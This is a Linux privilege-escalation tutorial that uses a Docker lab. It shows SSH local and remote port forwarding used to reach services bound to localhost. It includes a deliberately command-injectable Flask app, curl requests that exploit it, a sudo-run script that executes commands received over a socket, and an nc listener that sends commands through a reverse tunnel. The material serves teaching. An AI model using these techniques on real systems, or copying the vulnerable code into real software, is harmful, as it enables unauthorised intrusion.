                     _____________________________

                       LINUX PRIVILEGE ESCALATION
                      Local Services Exploitation

                            Leonardo Tamiano
                     _____________________________


Table of Contents
_________________

1. Docker Setup
2. Local Services
3. Examples
.. 1. Local Port Forwarding
.. 2. Remote Port Forwarding


1 Docker Setup
==============

  Build docker
  ,----
  | docker build --no-cache -t local-service-lab-1 .
  | docker build --no-cache -t local-service-lab-2 .
  | 
  | docker run -td --name local-service-lab-1 -p1337:22 --rm local-service-lab-1
  | docker run -td --name local-service-lab-2 -p1337:22 --rm local-service-lab-2
  `----

  Login with ssh
  ,----
  | ssh -p1337 -o "UserKnownHostsFile=/dev/null" ubuntu@127.0.0.1
  `----


2 Local Services
================

  Sometimes services are configured to only listen in local network
  interfaces.

  In these cases, we are not able to access those services from the
  internet. We need an access to get inside the machine, such as an
  `ssh' connection.

  When you connect to a compromised machine, always check the network
  interfaces available with the command `ip a', and check if there are
  any `open ports' or `processes' which listens on well known ports.

  - Check network interfaces

    ,----
    | ip a
    `----

  - Check listening

    ,----
    | netstat -ltpn
    `----

  - Check processes

    ,----
    | ps aux
    `----

  ----------------------------------------------------------------------

  There are two main ways in which we can access local services:

  - *Local Port Forwarding*

    Local Port Forwarding redirects traffic from a local port on the
    client machine to a specified port on a remote server through an SSH
    connection.

  - *Remote Port Forwarding*

    Remote Port Forwarding redirects traffic from a port on the remote
    server to a specified port on the client machine, allowing external
    access to local services.


3 Examples
==========

3.1 Local Port Forwarding
~~~~~~~~~~~~~~~~~~~~~~~~~

  Simple vulnerable flask app
  ,----
  | #!/usr/bin/env python3
  | 
  | import subprocess
  | from flask import Flask, request
  | 
  | app = Flask(__name__)
  | 
  | @app.route("/cmd")
  | def hello_world():
  |     cmd = request.json["cmd"]
  |     res = subprocess.run([cmd], stdout=subprocess.PIPE)
  |     return res.stdout
  | 
  | # ----------------------------------------------------------
  | 
  | if __name__ == '__main__':
  |     app.run(host="127.0.0.1", port=7777, debug= True)
  | 
  `----

  If we're able to reach this application, the exploitation is easy.

  ,----
  | curl -X GET http://127.0.0.1:7777/cmd -d '{"cmd": "whoami"}' -H "Content-Type: application/json"
  `----

  However, notice that the application only listen in the local
  interface `127.0.0.1' of the docker container.

  How can we reach that interface?

  ----------------------------------------------------------------------

  The idea is to use `ssh'.

  Specifically, with ssh it is possible to instruct the connection to
  perform a `local port forwarding', creating a TCP connection between
  an endpoint on the client machine and forwarding all the traffic
  towards an endpoint that lives on the server machine.

  This port forwarding can be done with the option `-L'

  ,----
  | ssh -p1337 -o "UserKnownHostsFile=/dev/null" -L1338:127.0.0.1:7777 ubuntu@127.0.0.1 
  `----

  With this we can exploit the previous vulnerability as follows

  ,----
  | curl -X GET http://127.0.0.1:1338/cmd -d '{"cmd": "whoami"}' -H "Content-Type: application/json"
  `----


3.2 Remote Port Forwarding
~~~~~~~~~~~~~~~~~~~~~~~~~~

  Simple python app
  ,----
  | #!/usr/bin/env python3
  | 
  | import subprocess
  | import socket
  | 
  | HOST = "127.0.0.1"
  | PORT = 4444
  | 
  | def main():
  |     global HOST, PORT
  |     
  |     try:
  |         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
  |             s.connect((HOST, PORT))
  |             data = s.recv(1024).decode("utf-8")
  |             line = data.split(" ")
  |             if line[0] == "CMD":
  |                 res = subprocess.run([line[1].strip()], stdout=subprocess.PIPE)
  |                 s.send(res.stdout)
  | 
  |     except Exception as e:
  |         print("[ERROR] - Problem during communication!")
  |         print(e)
  |         
  | if __name__ == "__main__":
  |     main()
  | 
  `----

  Within the remote machine we can execute such script as sudo.

  ,----
  | ubuntu@46530bfe9d9d:~$ sudo -l
  | Matching Defaults entries for ubuntu on 46530bfe9d9d:
  |     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
  | 
  | User ubuntu may run the following commands on 46530bfe9d9d:
  |     (ALL) NOPASSWD: /usr/bin/python3 /app/app.py
  `----

  The problem is that we cannot create a local service listening on that
  port.

  ----------------------------------------------------------------------

  To solve this problem the idea is to use `remote port forwarding',
       which allows us to connect the python script TCP client with a
       remote service that is running on our host machine.

  We can use `ssh'

  ,----
  | ssh -p1337 -o "UserKnownHostsFile=/dev/null" -R 4444:127.0.0.1:1338 ubuntu@127.0.0.1
  `----

  Then, in our host, we setup an NC listener

  ,----
  | nc -lvnp 1338
  `----

  We connect from the remote machine to our listener, going through the
  `reverse tunnel'.

  ,----
  | ubuntu@46530bfe9d9d:~$ sudo /usr/bin/python3 /app/app.py 
  `----

  And from the nc listener we send the following string

  ,----
  | CMD whoami
  `----
